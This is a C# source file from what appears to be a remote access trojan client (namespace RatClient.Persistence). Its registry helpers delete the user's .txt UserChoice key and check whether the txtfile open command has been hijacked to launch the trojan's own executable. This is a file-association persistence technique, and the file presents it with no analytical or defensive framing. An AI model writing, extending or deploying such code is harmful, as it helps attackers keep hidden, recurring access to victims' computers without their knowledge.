using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RatClient.Persistence
{
    class RegTools
    {
        public static bool RemoveUserChoice()
        {
            bool status = false;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt", true))
            {
                if (key != null)
                {
                    key.DeleteSubKeyTree("UserChoice", false);
                    status = true;
                }
            }
            return status;
        }
        public static bool IsPersistTxtfile()
        {
            using (RegistryKey key = Registry.ClassesRoot.OpenSubKey("txtfile\\shell\\open\\command"))
            {
                if (key != null)
                {
                    var defaultValue = key.GetValue(null);
                    if (defaultValue != null)
                    {
                        return defaultValue.ToString().Contains(Info.CurrentexecutablePath);
                    }
                }
            }
            return false;
        }
    }
}
